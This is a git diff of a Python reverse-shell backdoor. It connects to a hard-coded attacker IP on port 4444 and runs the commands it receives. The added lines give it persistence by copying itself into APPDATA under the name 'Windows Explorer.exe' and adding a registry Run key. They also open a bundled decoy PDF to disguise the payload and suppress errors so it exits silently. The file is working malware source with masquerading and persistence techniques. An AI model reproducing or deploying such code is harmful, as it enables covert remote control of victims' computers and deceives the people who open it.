@@ -1,26 +1,34 @@
 # Open a listening port on your machine with netcad: nc -vv -l -p 4444
 
+from pickle import TRUE
 import socket
 import subprocess
 import json
 import sys
 import os
 import base64
+import shutil
 
 class Backdoor:
 
     def __init__(self, ip, port):
         # Connection between the backdoor and the ATTACKER machine
+        self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             self.connection.connect((ip, port))
         except ConnectionRefusedError:
             print("[-] Connection could not be established: Port closed.")
 
+    def persistence(self):
+        loc = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(loc):
+            shutil.copyfile(sys.executable, loc)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + loc +  '"', shell=True)
 
     def execute(self, command):
         DEVNULL = open(os.devnull, 'wb')
-        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+        return subprocess.check_output(command, shell=TRUE)
 
 
     def reliable_send(self, data):
@@ -78,5 +86,12 @@ class Backdoor:
 
             self.reliable_send(command_output)
 
-backdoor = Backdoor('192.168.217.138', 4444)
-backdoor.run()
+
+file_name = sys._MEIPASS + "\sample.pdf"
+subprocess.Popen(file_name, shell=True)
+
+try:
+    backdoor = Backdoor('192.168.217.138', 4444)
+    backdoor.run()
+except Exception:
+    sys.exit()
